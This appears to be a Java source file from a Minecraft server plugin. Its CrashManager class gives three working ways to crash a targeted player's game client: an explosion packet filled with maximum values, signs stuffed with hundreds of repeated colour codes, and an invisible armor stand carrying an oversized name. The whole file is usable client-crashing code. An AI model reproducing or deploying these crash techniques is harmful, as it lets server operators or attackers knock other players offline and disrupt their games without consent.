package net.xenvision.xendelay.utils;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.entity.ArmorStand;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;

import java.util.ArrayList;

public class CrashManager {

    public enum CrashType { SIGN, ENTITY, PAYLOAD }

    private final WrapperPlayServerExplosion crashPacket;

    public CrashManager() {
        crashPacket = new WrapperPlayServerExplosion(
                new Vector3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE),
                Float.MAX_VALUE,
                new ArrayList<>(),
                new Vector3f(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE)
        );
    }

    public void crashWithSign(Player player) {
        Location loc = player.getLocation().clone();
        Block block = loc.getBlock();
        block.setType(Material.OAK_SIGN, false);
        String crashLine = "§c".repeat(512);
        if (block.getState() instanceof Sign) {
            Sign sign = (Sign) block.getState();
            for (int i = 0; i < 4; i++) sign.setLine(i, crashLine);
            sign.update();
        }
        player.sendSignChange(block.getLocation(), new String[] {crashLine, crashLine, crashLine, crashLine});
    }

    public void crashWithArmorStand(Player player) {
        Location loc = player.getLocation().clone();
        String crashName = "§c".repeat(512);
        World world = player.getWorld();
        ArmorStand stand = (ArmorStand) world.spawnEntity(loc, EntityType.ARMOR_STAND);
        stand.setInvisible(true);
        stand.setCustomName(crashName);
        stand.setCustomNameVisible(true);
        stand.setMarker(true);
        Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugins()[0], stand::remove, 20L);
    }

    public void crashWithPayload(Player bukkitPlayer) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(bukkitPlayer, crashPacket);
    }

    public void crashPlayer(Player player, CrashType type) {
        switch (type) {
            case SIGN:
                crashWithSign(player);
                break;
            case ENTITY:
                crashWithArmorStand(player);
                break;
            case PAYLOAD:
                crashWithPayload(player);
                break;
        }
    }
}